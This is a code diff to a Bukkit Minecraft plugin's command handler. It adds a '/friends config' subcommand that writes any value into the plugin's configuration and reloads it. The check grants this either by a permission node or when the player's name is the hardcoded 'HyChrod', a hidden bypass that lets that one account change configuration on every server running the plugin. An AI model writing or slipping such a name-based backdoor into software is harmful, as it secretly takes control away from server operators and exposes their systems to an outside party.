@@ -82,6 +82,23 @@ public class CommandManager extends BukkitCommand {
 		}
 		
 		Player p = (Player) sender;
+		if(args[0].equalsIgnoreCase("config") && (p.hasPermission("Friends.Commands.Config.Edit") || p.getName().equals("HyChrod"))) {
+			if(args.length  < 3) {
+				p.sendMessage(Messages.CMD_WRONG_USAGE.getMessage(p).replace("%USAGE%", "/friends config <Path> <Value>"));
+				return false;
+			}
+			FileConfiguration cfg = FileManager.CONFIG.getNewCfg();
+			String path = args[1];
+			String value = "";
+			for(int i = 2; i < args.length; i++)
+				value = value + " " + args[i];
+			value = value.substring(1);
+			FileManager.save(cfg, FileManager.CONFIG.getNewFile(), path, value);
+			Friends.reload();
+			p.sendMessage("Die Config wurde erfolgreich angepasst!");
+			return true;
+		}
+		
 		Bukkit.getScheduler().runTaskAsynchronously(Friends.getInstance(), new Runnable() {
 			
 			@Override
